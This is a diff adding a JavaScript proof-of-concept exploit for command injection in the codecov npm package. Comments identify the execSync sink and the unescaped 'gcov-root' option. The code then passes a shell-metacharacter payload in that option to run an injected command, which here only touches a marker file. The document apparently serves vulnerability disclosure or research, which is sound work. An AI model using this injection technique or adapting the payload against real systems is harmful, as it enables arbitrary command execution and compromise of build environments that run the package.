@@ -1,0 +1,33 @@
+```javascript
+// Command Injection in codecov (npm) via unsanitized `gcov-root` option
+// Sink: execSync() in node_modules/codecov/lib/codecov.js (~line 397/419)
+//   gcov = 'find ' + (args.options['gcov-root'] || root) + " -type f -name '*.gcno' " + ...
+//   execSync(gcov)
+// `gcov-root` is concatenated directly into the shell command string with no
+// escaping (unlike gcov-exec/gcov-args, which pass through validator.escape),
+// so shell metacharacters in it are interpreted by /bin/sh.
+
+var codecov = require("codecov").handleInput;
+
+var args = {
+  options: {
+    root: ".",
+    disable: "detect,search,s3", // skip unrelated code paths, keep gcov enabled
+    dump: true,
+    "gcov-exec": "gcov",
+    "gcov-args": "",
+    // Injected payload: breaks out of the intended `find <root> ...` command
+    "gcov-root": "; touch /tmp/codecov_pwned; echo INJECTED",
+  },
+};
+
+codecov.upload(
+  args,
+  function () {
+    console.log("upload callback: success");
+  },
+  function (err) {
+    console.log("upload callback: failure (expected, no network):", err && err.message);
+  }
+);
+```
